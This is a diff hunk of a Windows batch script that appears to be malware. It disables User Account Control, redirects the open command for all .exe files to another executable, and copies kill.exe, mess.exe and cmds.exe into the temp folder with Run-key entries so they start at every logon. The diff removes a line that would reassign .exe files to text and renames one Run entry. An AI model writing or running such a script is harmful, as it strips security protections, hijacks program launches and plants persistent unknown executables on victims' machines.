@@ -29,14 +29,13 @@ reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Sy
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /f
 reg add HKEY_CLASSES_ROOT\exefile\shell\open\command /d C:\Windows\winnt32.exe"%1"%* /f
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\.exe" /d "txtfile"
 copy kill.exe %temp%
 set a=%temp%\kill.exe
 reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "kill" /d  "%a%" /f
 copy "mess\mess.exe" %temp%
 copy "mess\mes.exe" %temp%
 set a=%temp%\mess.exe
-reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "mess" /d  "%a%" /f
+reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "cds" /d  "%a%" /f
 copy "cmds.exe" %temp%
 set a=%temp%\cmds.exe
 reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "mess" /d  "%a%" /f
